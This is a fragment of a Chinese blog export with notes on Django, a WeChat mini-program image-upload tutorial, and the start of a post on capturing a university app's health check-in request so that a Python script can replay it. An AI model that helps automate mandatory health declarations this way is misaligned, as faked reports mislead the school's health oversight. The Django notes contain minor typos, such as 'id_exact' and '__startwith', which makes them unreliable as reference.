返回值：QuerySet，存放模型实例\n\nexclude(条件)  语法同上  等价于 WHERE NOT  作用：返回不包含此条件的全部数据集  电商取非可以用该语句\n\nget(条件)  容易报错，一定要Try一下  语法：MyModel.objects.get（条件）  作用：返回满足条件的唯一一条数据  说明：该方法只能返回一条数据，直接获得Object  查询结果多于一条则抛出异常；查询结果没有数据则抛出Model.DoesNotExist异常。\n\n\n查询谓词类属性 + ‘__’ + 谓词定义：做更灵活的条件查询时需要使用查询谓词说明：每一个查询谓词都是一个独立的查询功能\n\n__exact:等值匹配\n\n\n\n\n\n\n\n\n\n\nAuthor.objects.filter(id_exact&#x3D;1) &lt;&#x3D;&gt; SELECT * FROM Author WHERE ID&#x3D;1\n\n__contains:包含指定值\n\n\n\n\n\n\n\n\n\n\nAuthor.objects.filter(name__contains&#x3D;’w’)SELECT * FROM Author WHERE name Like ‘%w%’\n\n__startwith:以xxx开始\n__endwith:以xxx结束\n__gt:大于指定值\n__gte:大于等于\n__lt:小于\n__lte:小于等于\n__in:指定范围内\n\n\n\n\n\n\n\n\n\n\nAuthor.objects.filter(name__in&#x3D;[‘中国’，’美国’])\n\n__range:查询数据是否在指定区间范围内\n\n\n\n\n\n\n\n\n\n\nAuthor.objects.filter(age__range(35,50))&lt;&#x3D;&#x3D;&gt; SELECT * FROM Author WHERE age BETWEEN 35 AND 50\n更新操作1.针对单个数据的修改查(get())-&gt;改：通过对象.属性的方式更改-&gt;保存：对象.save()2.批量更新数据直接调用QuerySet的update(属性&#x3D;值实现批量修改)针对QuerySet来做更改\n删除操作1.单个数据删除\n\n查找对应的数据对象\n调用该数据对象的delete()方法实现删除\n\n2.批量数据删除\n\n查找QuerySet\n调用delete()方法实现删除\n\n3.伪删除操作通过在表里添加一个布尔型字段（is_active），默认是True；执行删除时，将欲删除数据的is_active置为False。注意：使用伪删除时，确保显示数据的地方，均添加了is_active&#x3D;True的过滤查询。\nF对象F对象(很适合用于点赞)·········································**F对象实际等价于语句：UPDATE TABLE SET COLUMN&#x3D;TABLE.VALUE+10使用单句的数据库查询语句，Mysql的InnoDB引擎使用行锁，因此F对象的本质是使用了数据库中的锁。 **·········································\nfrom django.db.models import F\n\n\n一个F对象代表数据库中某条记录的字段的信息(不直接取出来)\n作用：通常对数据库字段值在不获取的情况下进行操作，用于类属性之间的比较  F(‘列名’)  对数据库字段值在不获取的情况下进行操作：  例：需求：将Book表中所有的market_price全部自增10。\n\n该需求原本只能通过循环取出每一个数据后+10再写入实现。\nQuery的update方法必须结合F对象方法实现使用F语句\nBook.objects.all().update(market_price=F('market_price')+10)\n\n用于类属性之间的比较：\nBook.objects.filter(market_price_gt=F('price')+10)\n\nQ对象用于进行逻辑或、逻辑非操作时使用\nBook.objects.filter(Q(market_price_lt=35)|Q(price_gt=40))\n\nQ对象能够实现互相间的&amp;与,|或,非,&amp;与非等操作。\n聚合查询聚合查询是指对一个表中的一个字段的数据进行部分或全部进行统计查询。分为整表聚合和分组聚合。\n\n整表聚合  聚合函数需要导入\n\nfrom django.db.models import *\n\n语法：\nMyModel.objects.aggregate(结果变量名（别名）=聚合函数('列'))\n\n返回：字典\n\n分组聚合  其实是为了实现Having语句  通过计算查询结果中每一个对象所关联的对象集合，从而得出总计值，为查询集的每一项生成聚合\n\nQuerySet.annotate(结果变量名（别名）=聚合函数('列'))\n\n返回：QuerySet\n原生数据库操作：1.只用来查询：MyoModel.objects.raw(sql语句，拼接参数)\n\n返回值：RawQuerySet集合对象，不支持方法串联，只支持基本的循环等。\nSQL注入问题：使用原生语句，使用拼接参数的方式进行查询能适当避免SQL注入问题。\n2.完全跨过模型类操作数据库\n\n导入\n\nfrom django.db import connection\n\n\n用创建cursor类的构造函数创建cursor(游标)对象，为保证在出现异常时能够释放cursor，通常用with来创建操作\n\nwith connection.cursor() as cur:\n    cur.execute('执行SQL语句','拼接参数')\n\nadmin后台管理admin后台用于开发过程中调用和调试，django会搜集所有已注册的模型类，并为这些模型类提供数据管理界面。\n后台的创建：python manage.py createsuperuser\n\n注册自定义模型类\n在应用的admin.py导入注册要管理的models类\n调用admin.site.register方法进行注册\n\n显示样式是按照models.py中__str__方法显示的。\n模型管理器类作用：为后台管理界面添加便于操作的新功能继承于django.contrib.admin里的ModelAdmin类\n\n在应用的admin.py定义模型管理器类\n\nclass XXXXManager(admin.ModelAdmin):\n    ……\n\n\n绑定注册模型管理器和模型类,使用调用admin.site.register方法的第二个参数\n\n类属性：\nclass XXXXManager(admin.ModelAdmin):\n    #表头\n    list_display = ['id','title','price']\n    #控制list_display哪些字段超链接进修改页\n    list_display_links = ['title']\n    #添加过滤器\n    list_filter = ['id']\n    #添加搜索框（模糊查询）\n    search_fields = ['title']\n    #添加可在列表页可编辑的字段，与\n    #list_display_links字段是互斥的\n    list_editable = ['price']\n\n关系映射关系映射：一对一，一对多，多对多。\n一对一映射创建一对一外键：语法：OneToOneField(类名, on_delete&#x3D;xxx(级联删除：在存在键的前提下的删除规则))on_delete:\n\nmodels.CASCADE：级联删除，只是模拟SQL约束ON DELETE CASCADE，不影响Mysql设置。\nmodels.PROTECT:保护删除，等同于mysql默认的RESTRICT\nSET_NULL:保留关联数据，设置为NULL\nSET_DEFAULT:将外键设置为默认值。\n\n创建一对一数据无外键的模型类，和之前相同有外键的模型类：\n\n\n\n\n\n\n\n\n\nwife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author &#x3D; author1(类属性名称绑实例))wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author_id &#x3D; 1(类属性字段绑值))\n一对一查询\n\n正向查询：从外键查对象\n反向查询：从对象查外键  调用反向属性查询到关联的一方\n\n一对多查询核心：正向属性(authors)和反向属性(book_set)在多表上设置外键，关联一表。\n创建一对多数据：语法：Foreignkey(“一”的模型类, on_delete&#x3D;xxx(级联删除：在存在键的前提下的删除规则))\n添加数据：先添加“一”，再添加“多”。无外键的模型类，和之前相同有外键的模型类：类似上面\n\n\n\n\n\n\n\n\n\nwife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author &#x3D; author1(类属性名称绑实例))wife &#x3D; Wife.objects.create(name&#x3D;’王夫人’,author_id &#x3D; 1(类属性字段绑值))\n查询数据：正向查询（有显性属性的）：由book查出版社：book.publisher反向查询(使用反向属性)：\n\n\n\n\n\n\n\n\n\nbooks &#x3D; pub1.book_set.all()或books &#x3D; Book.objects.filter(publisher&#x3D;pub1)\n多对多映射核心：正向属性(authors)和反向属性(book_set)mysql中多对多需要用三张表实现Django中无需手动创建第三张表，Django自动完成\n创建字段语法：属性 &#x3D; models.ManyToManyField(MyModel)\n创建数据：\n\n1.先创建Author，再关联book\n\n\n\n\n\n\n\n\n\n\nauthor1 &#x3D; Author.objects.create(name&#x3D;’1’)author2 &#x3D; Author.objects.create(name&#x3D;’2’)book1 &#x3D; author1.book_set.create(title &#x3D; ‘1’)#创建author2.book_set.add(book1)#绑定\n\n2.先创建book,再关联author\n\n\n\n\n\n\n\n\n\n\nbook &#x3D; Book.objects.create(title&#x3D;’p1’)author3 &#x3D; book.authors.create(name&#x3D;”3”)book.authors.add(author1)\nCookies和Session会话从打开浏览器访问一个网站，到关闭浏览器结束此次访问，称之为一次会话。HTTP本身是无状态的，导致会话状态难以保持。\nCookies保存在客户端浏览器上的存储空间特点：\n\ncookies在浏览器是以键值对的形式进行存储的，键和值都是以ASCII码的形式存储的\n存储的数据带有生命周期\ncookies的数据是按照域隔离的，不同的域之间无法访问\ncookies的内部数据会在每次访问此网站时都会携带到服务器，如果cookies过大会影响访问速度。\n\n存储HttpResponse.set_cookie(key,value&#x3D;’’,max_age&#x3D;None,expires&#x3D;None)-key:cookie的名字-value：cookie的值-max_age：存活相对时间，秒-expires：具体过期时间当不指定max_age和expires时，关闭浏览器时此数据失效。\n删除&amp;获取获取：request.COOKIES删除：request.delete_cookie(key)\nsession会话保持-登录流程用户登录-&gt;账号密码传至后端，服务器数据库验证，正确则发放cookie-&gt;后续浏览器将自动把当前域下的cookie都发送至服务器。但浏览器存储不是十分安全，因此引入了session。\nsession技术实际将数据存在了服务器里，对于不同的浏览器有不同的存储空间，生成空间后，会将一个sessionID返还给浏览器，浏览器会将sessionID存储在Cookies，之后每次返还给服务器。\nsession是在服务器上开辟一段空间用于保留浏览器和服务器交互时的重要数据。\nsession初始配置：\n\n1.INSTALLED_APPS:django.contrib.sessions\n2.MIDDLEWARE:  ‘django.contrib.sessions.middleware.SessionMiddleware’\n\nsession的使用：session对象是一个类似于字典的SessionStore类型的对象。\n\n保存session的值到服务器：  request.session[‘KEY’] &#x3D; VALUE\n获取session的值  value &#x3D; request.session[‘KEY’]  value &#x3D; request.session.get(‘KEY’,默认值)\n删除session  del request.session[‘KEY’]\n\n干预session时间：settings.py里的SESSION_COOKIE_AGE指定cookies中的保存时间，默认两周SESSION_EXPIRE_AT_BROWSER_CLOSE &#x3D; True,关闭浏览器自动清除session，默认FalseSESSION的数据在Django中保存在数据库中，因此需要保证已经执行过了migrate\nDjango session的问题：\n\n1.django session的表是单表设计，且该表数据量不会自动清理，哪怕是已经过期。\n2.可以每晚执行python manage.py clearsessions，会自动删除已经过期的session数据。\n\n缓存定义：缓存是一类可以更快的读取数据的介质统称，也指其他可以加快数据读取的存储方式。一般用来存储临时数据，常用介质的是读取速度很快的内存。意义：视图渲染有一定成本，数据库的频繁查询过高；所以对于低频变动的页面可以考虑使用缓存技术，减少实际渲染次数；用户拿到响应的时间成本会更低。场景：1.博客列表页；2.电商商品详情页场景特点：数据变动频率较少\nDjango中设置缓存：(settings.py)\n数据库缓存：将缓存存储在数据库中，尽管存储介质还是数据库，但把一次复杂查询的结果直接存储在表里，可避免重复进行复杂查询，提升效率。\n\n配置方法：\nCACHES=&#123;\n    'default': &#123;\n        'BACKEND':'django.core.cache.backends.db.DatabaseCache',#引擎\n        'LOCATION':'my_cache_table',#指定用于缓存的表\n        'TIMEOUT':300,#缓存时间\n        'OPTIONS':&#123;\n            'MAX_ENTRIES':300,#最大存储条数\n            'CULL_FREQUENCY':2,#缓存条数达到最大值时，删除1/x的数据\n        &#125;\n    &#125;\n&#125;\n\n\n缓存到服务器内存中  配置方法：\n\nCACHES=&#123;\n    default: &#123;\n        'BACKEND':'django.core.cache.backends.locmem.LocMemCache',#引擎\n        'LOCATION':'unique-snowflake',#雪花算法内存寻址\n    &#125;\n&#125;\n\n\n将缓存数据存储到本地文件中  配置方法：\n\nCACHES=&#123;\n    default: &#123;\n        'BACKEND':'django.core.cache.backends.filebased.FileBasedCache',#引擎\n        'LOCATION':'/var/tmp/django_cache',#存储路径\n        # win'c:\\test\\cache'\n    &#125;\n&#125;\n\n整体缓存策略\n视图函数中  django还是使用了装饰器来实现缓存逻辑\n\nfrom django.views.decorators.cache import cache_page\n@cache_page(30)# 单位秒\ndef my_view(request):\n\n\n路由中  一个道理，在进入视图函数前首先使用装饰器。换个地方写而已。\n\nfrom django.views.decorators.cache import cache_page\nurlpatterns = [\n    path('foo/',cache_page(60)(my_view)),\n]\n\n使用简单粗暴，但是无法控制。\n局部缓存策略相较于整体缓存更加灵活，复用性更好。缓存api的使用：\n\n方式1：使用caches[‘CACHE配置key’]导入具体对象\n\nfrom django.core.caches import caches\ncache1 = caches['myalias']\ncache2 = caches['myalias_2']\n\n\n方式2\n\n直接调用CACHE中的default值。相当于1中的\ncache = caches['default']\nfrom django.core.caches import cache\n\n缓存api：\n\n1.cache.set(key,value,timeout)-存储缓存  key:缓存的key，字符串类型  value:python对象  timeout：缓存存储时间，默认为CACHES中的TIMEOUT值  返回值：None\n2.cacahe.get(key)-获取缓存  key：缓存的key  返回值，key的对应值，没有则返回None\n3.cache.add(key,value)-存储缓存，只在key不存在的时候生效  返回值：True或False\n4.cache.get_or_set(key,value,timeout)\n5.cache.set_many(dict,timeout)\n6.cache.get_many(key_list)\n7.cache.delete(key)\n8.cache.delete_many(key_list)\n\n浏览器缓存策略-强缓存不会向服务器发送请求，直接从缓存中读取资源\n\n1.响应头-Expires：定义缓存过期时间，是服务器端的具体的时间点  样例：Expires:Thu,02 Apr 2030 05:14:08 GMT\n2.响应头-Cache-Control  ‘Cache-Control:max-age&#x3D;120’120秒后缓存失效  说明：目前服务器都会带着这两个头同时响应给浏览器，浏览器优先使用Cache-Control  cache-page整体缓存自带强缓存功能\n\n浏览器缓存策略-协商缓存强缓存的对象是一些静态文件、大图片等，考虑到这类资源比较费带宽且不易变化，强缓存到期后，浏览器会根服务器进行协商，当前缓存是否可用，如果可用，服务器不必返回数据，浏览器继续使用原来缓存的数据，如果文件不可用，则返回最新数据。\n\n1.Last-Modified响应头：文件的最近修改时间，同时告诉服务器到期后协商\n2.If-Modified-Since请求头，浏览器向服务器请求协商，如果资源未发生变化，则返回304（响应体为空），否则返回200代表缓存不可用（响应体为最新资源）\n\n上述的两个头仅通过精确到秒的时间来判断缓存是否有效，不是特别精准，后来HTTP又引入了新的缓存头：\n\n3.Etag响应头：返回当前资源的唯一标识（由服务器生成），只要资源变化，Etag就会重新生成\n4.缓存到期，浏览器返回If-None-Match请求头，给服务器请求协商，服务器比对文件标识，不一致则认为资源不可用。\n\n中间件\n中间件是请求&#x2F;响应的钩子框架，用于全局改变Django的输入和输出。\n中间件以类的形式体现\n每个中间件负责一些特定的功能\n\n中间件方法继承django.utils.deprecation.MiddlewareMixin类中间件类须实现下列五个方法中的一个或多个：\n\nprocess_request(self,request)  执行路由之前被调用，在每个请求上调用，只能返回None或HttpResponse对象，None则通过。\nprocess_view(self,request,callback,callback_args,callback_kwargs)  在视图之前调用，在每个请求上调用，返回None或HttpResponse对象。\nprocess_response(self,request,response)  在响应返回浏览器被调用，在每个请求调用，返回HttpResponse对象。\nprocess_exception(self,request,exception)  当处理过程中抛出异常时调用，返回一个HttpResponse对象。用来统一抓所有视图函数的异常。\nprocess_template_response(self,request,response)  在响应中包含render方法时被调用，该方法返回二次封装后的render响应对象。\n\n中间件中的大部分方法返回None则表示进入下一项时间，返回HttpResponse则被拦截。\n编写中间件\n1.注册中间件settngs.py-MIDDLEWARE\n2.建立中间件包，编写中间件’\n\n中间件的执行顺序先由上到下，在进入视图后变为由下至上\nCSRF - 跨站伪造请求攻击利用Cookies自动提交功能，同时利用了form表单及一些html控件的跨域提交。\ndjango的防御机制：页面和COOKIE都有一个暗号，只有两个暗号同时发送到服务器并且能够匹配，才允许POST。配置步骤：\n\n保证django.middleware.csrf.CsrfViewMiddleware打开\n\n模板中，form标签下添加如下标签：\n  &#123;% csrf_token %&#125;\n\n当个别视图不需要django进行csrf保护可以用装饰器关闭对此视图的检查\nfrom django.views.decorators.csrf import csrf_exempt\n\n@csrf_exempt\ndef my_view(request):\n    return …\n\n分页分页指在web页面有大量数据需要显示，为了阅读方便在每个页中只显示部分数据。\n优点：\n\n\n方便阅读\n\n\n\n减少数据提取量，减轻服务器压力。\n\n\n\nDjango提供了Paginator类可以方便的实现分页功能Paginator类位于’django.core.paginator’模块中\npaginator对象负责分页数据整体的管理\n\n\n\n\n\n\n\n\n\npagenator &#x3D; Paginator(object_list,per_page)\n\nobject_list 需要分页数据的对象列表，如QuerySet\nper_page 分页数据个数\n返回值：Paginator对象\n\nPaginator对象属性\n\ncount：需要分页的数据对象总数\nnum_pages:分页后的页面总数\npage_range：从1开始的range对象，用于记录当前页码数\nper_page：每页数据个数\n\nPaginator方法paginator对象.page(number)    -参数number为页码信息(从1开始)    -返回当前number页对应的页信息    -如果提供的页码不存在，抛出InvalidPage异常，包含两种异常子类-PageNotInteger页码不是整数和-EmptyPage页码超页\npage对象Paginator对象的page()方法返回Page对象page &#x3D; paginator.page(页码)\npage对象属性：\n\nobject_list：当前页上所有数据对象的列表\nnumber:当前页面的序号，从1开始\npaginator：当前page对象相关的Paginator对象\n\nPage对象方法： \n\nhas_next():如果有下一页返回True\nnext_page_number():下一页页码，如果下一页不存在，抛出InvalidPage异常\nhas_previous:如果有上一页返回True\nprevious_page_number():返回上一页的页码，如果上一页不存在，抛出InvalidPage异常。\nhas_other_pages：如果有上一页或者有下一页返回True\n\ncsv文件\ncsv文件：逗号分隔值文件，其文件以纯文本形式存储表格数据（数字或文本）  说明：可被常见制表工具，如excel等直接进行读取\n\npython中生成csv文件python提供了内建库 -csv；可直接通过该库操作csv文件。案例：\nimport csv\nwith open('eggs.csv','w', newline='') as csvfile:# newline指文件输出时换行符怎么处理，空字符串将不会转义\n    writer = csv.writer(csvfile)\n    writer.writerow(['a','b','c'])\n\ncsv文件下载在网站中实现下载csv，注意如下：\n\n响应Content-Type类型需修改为text&#x2F;csv。这告诉浏览器该文档是CSV文件，而不是HTML文件\n响应为额外添加一个Content-Disposition标头，其中包含CSV文件的名称，它将被浏览器用于开启”另存为”对话框。\n\nimport csv\nfrom django.http import HttpResponse\nfrom .models import Book\n\ndef make_csv_view(request):\n    response = HttpResponse(content_type = 'text/csv')\n    response['Content-Disposition'] = 'attachment;filename = \"mybook.csv\"'\n    all_book = Book.objects.all()\n    writer = csv.writer(response)\n    writer.writerow(['id','title'])\n    for b in all_book:\n        writer.writerow([b.id,b.title])\n    return response\n\n内建用户系统模型类位置from django.contrib.auth.models import User（mysql中auth_user表）字段（属性）：\n\nusername 用户名\npassword 密码\nemail 邮箱\nfirst_name 名\nlast_name 姓\nis_superuser 是否为超级用户\nis_staff 是否为内部员工\nis_active 伪删除\nlast_login 上次登陆时间\ndate_joined 用户创建时间\n\n命令：\n\n1.创建普通用户create_user,主要是需要处理密码，将自动转化密码为hash值。\n\nfrom django.contrib.auth.models import User\nuser = User.objects.create_user(username=\"用户名\",password=\"密码\",email=\"邮箱\",…)\n\n\n2.创建超级用户create_superuser\n\n3.删除用户(伪删除，更新操作)\n\n4.校验密码\n\n\nfrom django.contrib.auth import authenticate\n\nuser = authenticate(username=username, password=password)\n\n如果用户名密码校验成功则返回用户对象，否则返回None\n\n5.修改密码set_password\n\n6.登录状态保持  只存session，且时间不可控\n\n\nfrom django.contrib.auth import login\ndef login_view(request)：\n    user = authenticate(username=username, password=password)\n    login(request,user)\n\n\n7.登录状态校验\n\nfrom django.contrib.auth.decorators import login_required\n@login_required\ndef index_view(request):\n    login_user = request.user#直接能拿到usert对象\n\n\n8.登录状态取消\n\nfrom django.contrib.auth import logout\ndef logout_view(request):\n    logout(request)\n\n内建用户表-扩展字段方案1:通过建立细腻哦啊，和内建表做1对1映射方案2：继承抽象user模型类方案2步骤：\n\n1.添加应用\n2.定义模型类，继承AbastractUser\n3.settings.py中指明AUTH USER MODEL &#x3D; ‘应用名.类名’\n\n！！注意：此操作需要在第一次migrate之前进行！！\nfrom django.db import models\nfrom django.contrib.auth.models import AbstractUser\n\nclass UserInfo(Abstractuser):\n    phone = models.CharField(max_length = 11, default = '')\n\n在settings.py里面添加配置：AUTH_USER_MODEL &#x3D; ‘user.UserInfo’\n添加用户from user.models import UserInfo\nUserInfo.objects.create_user(username&#x3D;……,phone&#x3D;’’)\n文件上传定义：用户可以通过浏览器将图片等文件传至网站场景：\n\n上传头像\n上传流程性的文件\n\n上传规范-前端上传必须为POST提交方式表单’&lt;\\form&gt;’中文件上传时必须有带有enctype&#x3D;’multipart&#x2F;form-data’时才会包含文件内容数据。表单中用&lt;input type &#x3D; ‘files’ name&#x3D;’xxx’&gt;标签上传文件\n上传规范-后端视图函数中，需要用request.FILES取文件框的内容file&#x3D;request.FILES[‘xxx’]说明：\n\n1.FILES的key对应页面中file框的name值\n2.file绑定文件流对象\n3.file.name文件名\n4.file.file文件的字节流数据\n\n配置文件的访问路径和存储路径在settings.py中设置MEDIA相关配置，Django将用户上传的文件统称为media资源\nMEDIA_URL='/media/'\nMEDIA_ROOT = os.path.join(BASE_DIR, 'media')\n\n同时MEDIA_URL和MEDIA_ROOT还需要手动绑定：在主路由添加：\nfrom django.conf import settings\nfrom django.conf.urls.static import static\nurlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)\n\n等价于做了MEDIA_URL开头的路由，Django接到该特征请求后去MEDIA_ROOT路径查找资源\n文件写入：\n\n1.open方法  可能出现文件名称的重名问题\n\n# 在视图函数POST中\na_file = request.FILES['myfile']\nfileadd = os.path.join(settings.MEDIA_ROOT,afile.name)\nwith open(filename,'wb') as f:\n    data = afile.file.read()\n    f.write(data)\nreturn HttpResponse\n\n\n2.借助ORM  字段FileField(upload &#x3D; ‘子目录名’)  建表时增加一个字段即可，实际收到后直接在视图函数中将绑定文件流对象扔给对应字段即可\n\nContent.objects.create(desc = title, content = a_file)\n\n该方法若文件名重复则django将自动添加后缀\ndjango发送邮件业务场景：\n\n业务报警\n邮件验证\n密码找回\n\n邮件相关协议\nSMTP：Simple Mail Transfer Protocol，简单邮件传输协议（port：25）  负责邮件的发送，属于“推送”协议\n\nIMAP：Internet Mail Access Protocol，交互式邮件访问协议，应用层协议（port：143）  负责本地邮件客户端访问远程服务器上的邮件，属于“拉取”协议\n\nPOP3：Post Office Protocol3：邮局协议第3个版本，是TCP&#x2F;IP协议族中的一员（port：110）  本协议主要用于支持使用客户端远程管理在服务器上的电子邮件，同样属于“拉取”协议。\n\n\nIMAP VS POP3:\n\n两者均为“拉取”协议，负责从邮件服务器中下载邮件\nIMAP支持摘要浏览功能，并且是双向协议，客户端操作可以反馈给服务器\nPOP3必须下载全部邮件，且为单向协议，客户端操作无法同步服务器。\n\nDjango发邮件Django中配置邮件功能，主要为SMTP协议，负责发邮件原理：\n\n给Django授权一个邮箱\nDjango用该邮箱给对应收件人发送邮件\ndjango.core.mail封装了电子邮件的自动发送SMTP协议\n\n授权：\n\n邮箱端修改  开启SMTP相关的功能，获得授权码。\nDjango修改(settings.py添加)\n\nEMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'# 引擎：写死\nEMAIL_HOST = 'smtp.qq.com'# 腾讯qq邮箱的SMTP服务器地址\nEMAIL_PORT = 25# 默认25\nEMAIL_HOST_USER = 'xxxx@qq.com'\nEMAIL_HOST_PASSWORD = '*******'# 指的是授权码\nEMAIL_USE_TLS = False # 与SMTP服务器通讯时，是否启动TLS连接（安全链接）默认为False，安全协议比较耗时\n\n发送：\nfrom django.core import mail\nmail.send_mail(\n    subject,\n    message,\n    from_email,# 发送邮箱\n    recipient_list = ['xxx@qq.com'],# 接受者邮箱列表\n)\n返回1则成功发送\n\n通过中间件可以捕获所有视图函数的异常，并发送到指定邮箱process_exception(self,request,exception)定位错误位置：异常追溯\nimport traceback\ntraceback.format_exc()# 直接获得错误具体位置及出错信息\n\n邮箱里可以直接发送traceback.format_exc()\n自定义收件人：在settings里自定义属性，在调用send_mail位置\nfrom django.conf import settings\nrecipient_list = settings.自定义属性\n\n\n项目部署在软件开发完毕后，将开发机器上运行的软件实际安装到服务器上进行长期运行\n\n安装机器上安装和配置同版本的环境[py,数据库等]\ndjango项目迁移，第三方工具：finalshare等 ubuntu直接用scp命令 sudo scp 需要复制文件路径 远程ip:路径\n用uWSGI替代python manage.py runserver方法\n配置nginx反向代理服务器\n用nginx配置静态文件路径，解决静态路径问题\n\nuWSGIWSGI：Web Server Gateway Interface，Web服务器网关接口，是Pyhton应用程序或框架和Web服务器之间的一种接口。uWSGI：WSGI的一种，实现了http协议、WSGI协议、uwsgi协议等多种协议。在python web圈热度极高，主要以学习配置为主。\nuWSGI安装pip命令可以安装[ubuntu验证安装]:sudo pip3 freeze|grep -i ‘uwsgi’[ubuntu安装]:sudo pip3 install uwsgi&#x3D;&#x3D;2.0.18 -i https://pypi.tuna.tsinghua.edu.cn/simple/\n配置uWSGI:\n\n项目同名文件夹&#x2F;uwsgi.ini\n\n如mysite1&#x2F;mysite1&#x2F;uwsgi.ini文件以[uwsgi]开头，有如下配置项：\n\n1监听端口  套接字方式的IP地址：端口号[此模式需要有nginx]  socket&#x3D;127.0.0.1:8000  Http通信凡是的IP地址：端口号  http&#x3D;127.0.0.1:8000\n2项目当前工作目录  chdir&#x3D;绝对路径\n3项目中wsgi.py文件目录，相对于当前工作目录  wsgi-file&#x3D;相对路径\n4进程个数(最多为cpu核数)  process&#x3D;4\n5每个进程的线程个数  threads&#x3D;2\n6服务的pid记录文件  pidfile&#x3D;uwsgi.pid\n7服务的日志文件位置(后台启动以及所有日志位置)  daemonize&#x3D;uwsgi.log\n8开启主进程管理模式  master&#x3D;true\n\n","slug":"后端框架学习-Django","date":"2021-05-05T14:16:00.000Z","categories_index":"学习笔记","tags_index":"Django,Python","author_index":"kif"},{"id":"f5218906270dc804bb69eb4b82ceca1a","title":"微信小程序云开发实现图片的上传、存储、访问","content":"我们在进行项目开发时，经常需要处理用户上传的图片，如果用传统的后端开发，处理起来是比较繁琐的。微信小程序云开发提供了一系列API供开发者完成想要的效果。下面我们要实现用户图片的上传、存储及访问。\n&lt;button type&#x3D;&quot;primary&quot; bindtap&#x3D;&quot;upImg&quot;&gt;上传图片&lt;&#x2F;button&gt;\n\n\n因为只是演示功能，我们用一个按钮实现点击事件的产生。首先我们用到的第一个API就是wx.chooseImage官方文档介绍:\n\nupImg()&#123;\n   var that &#x3D; this;\n   wx.chooseImage(&#123;\n     count: 1,\n     success(res)&#123;\n       console.log(res);\n     &#125;\n   &#125;)\n &#125;,\n\n然后我们试着选中一个图片，然后看控制台的输出内容。这个tempFilePaths是我们需要的数据。接下来我们使用第二个API，wx.cloud.uploadFile官方文档介绍：\n\nupImg()&#123;\n   var that &#x3D; this;\n   wx.chooseImage(&#123;\n     count: 1,\n     success(res)&#123;\n       console.log(res);\n       wx.cloud.uploadFile(&#123;\n         cloudPath:&#39;test&#x2F;&#39; + Math.floor(Math.random()*1000000),\n         filePath:res.tempFilePaths[0],\n         success(res)&#123;\n           console.log(&quot;成功&quot;,res);\n         &#125;\n       &#125;)\n     &#125;\n   &#125;)\n &#125;,\n\nwx.chooseImage里面其实没有什么我们需要填写的参数，直接使用就行。但是wx.cloud.uploadFile很明显需要我们填写cloudPath和filePath，这个cloudPath其实就是我们要在云存储中存放的位置，可以新建一个文件夹，也可以直接往里堆。我是新建了一个名为test的文件夹并且在后面拼接了一个很多位的随机数，避免重复。filePath就是我们上文提到的需要的数据，即wx.chooseImage的返回值中的tempFilePaths。然后我们现在再点击一下按钮，看一下wx.cloud.uploadFile的回调会给我们返回一个什么样的值。\n\nfileID和statusCodefileID就是在云存储中的链接，可以直接在客户端访问到。statusCode是一个状态码，可以用来判断操作是否成功。\n我们现在试一下fileID能不能直接在WXML中通过Image组件访问到\n&lt;image src&#x3D;&quot;cloud:&#x2F;&#x2F;creator-xcq6k.6372-creator-xcq6k-1301361703&#x2F;test&#x2F;461783&quot;&gt;&lt;&#x2F;image&gt;\n\n\n\n没有问题，是可以直接访问的。但是这个fileID仅仅只是在客户端可以被访问到，在一些业务场景下是不够的。下面这个API可以把fileID转化为https的url地址，供全网访问。wx.cloud.getTempFileURL官方文档介绍：\n\nupImg()&#123;\n  var that &#x3D; this;\n  wx.chooseImage(&#123;\n    count: 1,\n    success(res)&#123;\n      console.log(res);\n      wx.cloud.uploadFile(&#123;\n        cloudPath:&#39;test&#x2F;&#39; + Math.floor(Math.random()*1000000),\n        filePath:res.tempFilePaths[0],\n        success(res)&#123;\n          console.log(&quot;成功&quot;,res);\n          wx.cloud.getTempFileURL(&#123;\n            fileList:[res.fileID],\n            success(res)&#123;\n              console.log(res);\n            &#125;\n          &#125;)\n        &#125;\n      &#125;)\n    &#125;\n  &#125;)\n&#125;,\n\n\n这里的tempFileURL就是我们需要的url。复制一下，打开任意一个浏览器，粘贴到地址栏，就会弹出下载的弹窗\n下载了以后，因为没有后缀名所以是无法直接打开的，可以直接在后面填上.png或者.jpg的后缀。\n其实这里我推荐在当初填云存储的图片路径的时候，即cloudPath，就把图片的后缀加上，可以通过正则表达式获取真实的图片后缀，也可以人为的在后面手动拼接后缀，都没有问题。如果路径上有图片的后缀的话，其实就可以直接在网页上浏览图片了，当然也可以下载。\n转载：\n微信小程序云开发实现图片的上传、存储、访问\n","slug":"微信小程序云开发实现图片的上传、存储、访问","date":"2021-04-10T13:36:00.000Z","categories_index":"学习笔记","tags_index":"微信小程序","author_index":"kif"},{"id":"d157ee99180c5e77cd0b429c7733a938","title":"XTU每日打卡","content":"1.抓包1.1 工具使用ANDROID端app工具：httpcanary9.2.8.1\n手机下载安装后安装证书：\n\n\n\n之后点击小蓝飞机\n\n允许VPN\n便开始抓包了\n\nIOS端：Http Traffic\nHttp Traffic是一款 IOS 平台下的抓包工具，可以作为代{过}{滤}理服务器局域网内设备都可以连接并且抓包，监控网络手机或者 PC 机的网络请求，分析网络数据包情况。\nHttp Traffic使用 charles 的原理是一样的，通过本机启动一个代{过}{滤}理服务方式抓包，实现了以 iPhone 作为服务端的功能，在同一个局域网内的设备都可以进行连接。 可以抓取网络请求头和请求体的数据，同样可以抓取响应头和响应体的数据.\n局域网内可以访问 iPhone 的 http://ip:8002 链接通过浏览器来查看抓包记录,iPhone 本机可以使用http:&#x2F;&#x2F; 127.0.0.1:8002 来访问内嵌的展示网页。\n下载方式,Appstore 搜索 “http traffic” 即可下载.\n\n抓包历史记录,抓包历史存档在本机,可以随时查阅抓包的历史,\n\n会话内的数据包列表,可以展示数据包类型,数据包大小,以及图片预览等\n\n查看数据包的请求和响应数据情况,包括请求链接,请求头,请求行,状态,返回的数据包,响应的头信息等.\n1.2 抓取湘大校园打卡数据（以android端为例，IOS类比）关闭抓包软件\n打开湘大校园停留到健康信息上报界面，这里先不提交\n\n开启抓包\n上报\n回到抓包软件\n\n找到链接为 https://app.xiaoyuan.ccb.com/channelManage/outbreak/addOutbreak 的那一条数据\n点击     请求 -》RAW\n\n复制所有数据\n2.python文件import requests\nimport json\n \ndef sender():\n    url &#x3D; 